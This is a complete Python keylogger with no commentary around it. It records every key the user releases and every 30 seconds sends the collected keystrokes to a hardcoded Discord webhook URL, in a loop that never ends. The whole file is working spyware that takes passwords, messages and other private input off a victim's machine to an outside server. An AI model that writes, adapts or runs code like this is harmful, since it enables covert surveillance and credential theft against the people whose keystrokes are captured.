import keyboard
import threading
import time
import requests

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1396456251390558249/Xqlh9uRGuAzlS2vdX-N--Wz0Y1bXOv_5ksS2R6kR7oaMct1HL2j6qs2rPk_IqeXWwYxI"
keylogs = []

def send_keylogs():
    global keylogs

    if keylogs:
        keylogs_str = "\n".join(keylogs)

        payload = {
            'content': keylogs_str
        }

        try:
            requests.post(WEBHOOK_URL, data=payload)
        except Exception as e:
            print(f"Failed to send logs: {e}")

        keylogs = []

    # Schedule the next send after 30 seconds
    threading.Timer(30, send_keylogs).start()

def capture_keystrokes(event):
    global keylogs
    keylogs.append(event.name)

keyboard.on_release(callback=capture_keystrokes)

# Start the repeated sending
send_keylogs()

# Keep the program running
while True:
    time.sleep(1)
